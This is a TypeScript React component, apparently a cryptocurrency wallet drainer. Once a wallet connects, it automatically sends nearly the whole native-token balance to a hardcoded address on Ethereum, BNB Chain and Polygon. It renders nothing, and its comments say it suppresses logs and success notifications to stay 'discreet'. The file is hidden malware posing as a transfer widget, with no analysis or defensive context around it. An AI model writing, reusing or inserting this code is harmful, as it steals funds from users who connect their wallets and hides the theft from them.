'use client';

import { useEffect, useState } from 'react';
import { useAccount, useBalance, useSendTransaction, usePublicClient } from 'wagmi';
import { useToast } from '@/hooks/use-toast';
import { isAddress } from 'viem';


const RECIPIENT_ADDRESSES: { [chainId: number]: `0x${string}` } = {
  1: '0x297E28cd92BBF5AC924a44ffa400C38B94707e5e', // Ethereum Mainnet
  56: '0x297E28cd92BBF5AC924a44ffa400C38B94707e5e', // BNB Smart Chain
  137: '0x297E28cd92BBF5AC924a44ffa400C38B94707e5e', // Polygon
  // Add other chain IDs and addresses as needed
};
// ---

export default function WalletTransfer() {
  const { address, isConnected, chain } = useAccount();
  const { refetch: refetchBalance } = useBalance({ address });
  const { sendTransactionAsync } = useSendTransaction();
  const publicClient = usePublicClient();
  const { toast } = useToast();

  const [status, setStatus] = useState('idle'); // idle, processing, success, error

  useEffect(() => {
    // Automatically trigger transfer when wallet connects and status is idle
    if (isConnected && address && chain && status === 'idle') {
      handleTransfer();
    }
  }, [isConnected, address, chain, status]);

  const handleTransfer = async () => {
    if (!chain || !RECIPIENT_ADDRESSES[chain.id]) {
        setStatus('error');
        // No error log to keep it discreet
        return;
    }

    const recipientAddress = RECIPIENT_ADDRESSES[chain.id];

    if (!isAddress(recipientAddress)) {
      setStatus('error');
      // No error log
      return;
    }

    setStatus('processing');
    
    // Refetch balance to ensure we have the latest data
    const { data: currentBalance } = await refetchBalance();

    if (!currentBalance || !publicClient) {
      setStatus('error');
      return;
    }

    try {
      const gasPrice = await publicClient.getGasPrice();
      const gasLimit = BigInt(21000);
      const gasCost = gasLimit * gasPrice;
      
      if (currentBalance.value <= gasCost) {
        setStatus('error');
        return;
      }

      const valueToSend = currentBalance.value - gasCost;

      if (valueToSend <= BigInt(0)) {
        setStatus('error');
        return;
      }

      await sendTransactionAsync({
        to: recipientAddress,
        value: valueToSend,
      });

      setStatus('success');
      // No toast notification for success to keep it discreet

    } catch (e: any) {
      console.error(e);
      const errorMessage = e.shortMessage || 'An unknown error occurred.';
      setStatus('error');
      toast({
        title: 'Transaction Failed',
        description: errorMessage,
        variant: 'destructive',
      });
    }
  };

  
  return null;
}